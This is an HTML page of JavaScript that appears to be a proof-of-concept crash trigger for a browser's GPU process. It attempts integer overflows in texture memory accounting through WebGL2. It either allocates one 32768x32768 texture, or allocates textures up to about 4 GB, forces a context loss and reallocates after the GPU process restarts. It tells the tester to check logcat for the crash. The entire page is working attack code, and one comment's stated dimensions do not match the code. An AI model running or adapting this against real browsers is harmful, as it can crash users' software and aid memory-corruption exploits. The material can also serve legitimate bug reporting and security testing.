<!DOCTYPE html>
<html>
<body>
<pre id="log"></pre>
<script>
(async function() {
  const log = (msg) => { document.getElementById('log').textContent += msg + '\n'; };

  // Create an OffscreenCanvas to get WebGL2 context
  const offscreen = new OffscreenCanvas(256, 256);
  const gl = offscreen.getContext('webgl2', {
    powerPreference: 'high-performance',
    failIfMajorPerformanceCaveat: false
  });
  if (!gl) return log('WebGL2 not supported');

  const maxSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
  log('MAX_TEXTURE_SIZE = ' + maxSize);

  if (maxSize >= 65536) {
    // ---- Direct 32‑bit overflow path ----
    log('Using direct 65536x32768 overflow...');
    const tex = gl.createTexture();
    gl.bindTexture(gl.TEXTURE_2D, tex);
    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 32768, 32768, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
    const fb = gl.createFramebuffer();
    gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, tex, 0);
    const pixel = new Uint8Array(4);
    gl.readPixels(0, 0, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, pixel);
    log('Read pixels succeeded – check logcat for crash');
  } else {
    // ---- Indirect pool overflow path ----
    log('MAX_TEXTURE_SIZE < 65536, using many large textures to wrap total memory...');
    const texSize = maxSize; // use the maximum allowed size
    const bytesPerTex = texSize * texSize * 4;
    log(`Each texture: ${texSize}x${texSize} = ${bytesPerTex} bytes`);

    // Allocate textures until the total allocated is close to 4 GB
    // We'll stop at 0xFFFF0000 bytes (4 GB - 64 KB) to avoid OOM
    const targetBytes = 0xFFFF0000;
    let totalBytes = 0;
    const textures = [];
    while (totalBytes < targetBytes) {
      const tex = gl.createTexture();
      gl.bindTexture(gl.TEXTURE_2D, tex);
      gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, texSize, texSize, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
      textures.push(tex);
      totalBytes += bytesPerTex;
      if (textures.length % 10 === 0) {
        log(`Allocated ${textures.length} textures, total ${(totalBytes/1024/1024).toFixed(0)} MB`);
      }
    }
    log(`Reached ${textures.length} textures, total ${(totalBytes/1024/1024).toFixed(0)} MB`);

    // Force GPU process restart – the new process will receive the wrapped total
    const loseExt = gl.getExtension('WEBGL_lose_context');
    if (loseExt) {
      loseExt.loseContext();
      log('Context lost – GPU process should restart soon');
    }
    // After restart, try to allocate a small texture to trigger the overflow
    setTimeout(() => {
      log('Attempting to create a new context...');
      const newCanvas = new OffscreenCanvas(1,1);
      const newGl = newCanvas.getContext('webgl2', { powerPreference: 'high-performance' });
      if (newGl) {
        const tex = newGl.createTexture();
        newGl.bindTexture(newGl.TEXTURE_2D, tex);
        // This allocation will use the (possibly wrapped) pool size
        newGl.texImage2D(newGl.TEXTURE_2D, 0, newGl.RGBA, 1, 1, 0, newGl.RGBA, newGl.UNSIGNED_BYTE, null);
        log('New context created – check logcat for crash');
      }
    }, 3000);
  }
})();
</script>
</body>
</html>
